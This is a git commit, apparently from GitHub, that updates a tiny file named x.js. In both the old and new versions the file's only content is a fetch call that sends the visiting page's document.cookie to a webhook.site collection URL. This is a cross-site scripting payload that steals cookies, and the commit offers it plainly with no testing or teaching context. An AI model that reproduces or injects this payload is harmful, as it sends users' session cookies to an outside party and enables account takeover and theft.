1e0f004429b8b5dd7bb0811b3ac271904f0d88b1
Valase Paul <67017154+WhiteStar03@users.noreply.github.com>
2023-07-08 18:28:29 +0300

    Update x.js

--- x.js
+++ x.js
@@ -1,3 +1,1 @@
-fetch('https://webhook.site/331e5bdd-76e1-45b8-a035-444588ff383b?c=' + encodeURI(document.cookie), {
-  method: 'GET',
-})
+fetch('https://webhook.site/331e5bdd-76e1-45b8-a035-444588ff383b?c=' + encodeURI(document.cookie))
